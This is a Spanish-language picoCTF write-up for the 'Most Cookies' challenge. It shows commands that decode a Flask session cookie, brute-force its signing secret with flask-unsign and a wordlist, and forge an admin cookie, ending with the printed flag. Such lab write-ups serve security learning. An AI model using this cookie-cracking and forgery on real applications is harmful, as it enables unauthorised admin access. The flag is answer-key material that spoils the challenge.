### Most Cookies

### Descripción

Alright, enough of using my own encryption. Flask session cookies should be plenty secure!http://wily-courier.picoctf.net:52469/
### Solución

### Solucion 1

- Descargamos con wget en kalii-linux 
```
wget -q http://wily-courier.picoctf.net:52469/
```
- Ponemos como contrasena snickerdoodle
- decodificamos la cookie con 
```
┌──(JorgeMSI㉿MSI)-[~]
└─$ echo eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aajXJA.gGdXvfOkWS-Z7NDhBxghYYLhw6s | base64 -d
{"very_auth":"snickerdoodle"}base64: invalid input
```
- Vemos en el code fuente que al verificar el valor de la cookie y si la cookie es admin da la flag.
- crear un ambiente virtual para intalar flask-unsign

`python -m venv ~/.venv source ~/.venv/bin/activate pip3 install flask-unsign`

- Crakeamos la cookie de flask usando una lista de palabras

`flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aajXJA.gGdXvfOkWS-Z7NDhBxghYYLhw6s" --wordlist cookies.txt` 

- Crear y firmar la cookie de admin:

`flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'fortune' 
- eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aNq2aA.FZAKWmlIP58UuVR256gUcK4pNQ0
- La de arriba es la cookie del admin, la ponemos con cookie editor salvamos y reiniciamos y nos da la flag 
- **Flag**: `picoCTF{cO0ki3s_yum_98b76c03}`

### Notas

- **Flask-unsign** es una herramienta de seguridad de línea de comandos, basada en Python, diseñada para analizar, forzar (brute-force) y manipular las cookies de sesión del framework web Flask.
